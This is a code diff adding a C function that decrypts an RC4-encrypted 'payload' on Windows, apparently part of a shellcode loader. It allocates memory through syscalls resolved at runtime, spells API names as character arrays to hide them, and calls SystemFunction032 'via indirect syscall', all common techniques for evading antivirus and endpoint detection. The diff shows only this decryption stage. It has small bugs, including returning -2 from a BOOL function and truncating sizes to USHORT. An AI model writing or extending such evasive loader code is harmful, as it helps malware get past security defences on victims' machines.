@@ -31,3 +31,66 @@ BOOL Rc4Decrypt(IN PBYTE pPayloadData, IN SIZE_T sPayloadSize, IN PBYTE pRc4Key,
     
         return TRUE;
 }
+
+
+BOOL Rc4DecryptStandAlone(
+    IN PBYTE pPayloadData,
+    IN SIZE_T sPayloadSize,
+    IN PBYTE pRc4Key,
+    IN SIZE_T dwRc4KeySize,
+    OUT PBYTE *pPlainTextData,
+    OUT SIZE_T *sPlainTextSize
+) {
+        NTSTATUS status;
+        SIZE_T regionSize = sPayloadSize;
+        PBYTE decrypted = NULL;
+
+        // Allocate memory for the decrypted data using syscalls
+        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char[]){'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});        
+        if (!pNtAllocateVirtualMemory) {
+                DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
+                return -2; // Error code
+        }
+
+        status = pNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (status != 0) {
+                DebugPrint("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
+                return FALSE;
+        }
+
+        // Prepare USTRING structures for RC4 key and payload
+        USTRING Key = { .Buffer = pRc4Key, .Length = (USHORT)dwRc4KeySize, .MaximumLength = (USHORT)dwRc4KeySize };
+        USTRING Img = { .Buffer = decrypted, .Length = (USHORT)sPayloadSize, .MaximumLength = (USHORT)sPayloadSize };
+
+        // Copy the payload data into allocated memory
+        memcpy(decrypted, pPayloadData, sPayloadSize);
+
+        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscall((char[]){'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0'});
+        if (!pNtFreeVirtualMemory) {
+                DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
+                return -2; // Error code
+        }
+        
+        // Resolve SystemFunction032 via indirect syscall
+        fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)PrepareSyscall("SystemFunction032");
+        if (!pSystemFunction032) {
+                DebugPrint("[-] Failed to prepare syscall for SystemFunction032.\n");
+                pNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, &regionSize, MEM_RELEASE);
+                return FALSE;
+        }
+
+        // Perform RC4 decryption
+        status = pSystemFunction032(&Img, &Key);
+        if (status != 0x0) {
+                DebugPrint("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", status);
+                pNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&decrypted, &regionSize, MEM_RELEASE);
+                return FALSE;
+        }
+
+        // Set output parameters
+        *pPlainTextData = decrypted;
+        *sPlainTextSize = Img.Length;
+
+        return TRUE;
+}
+
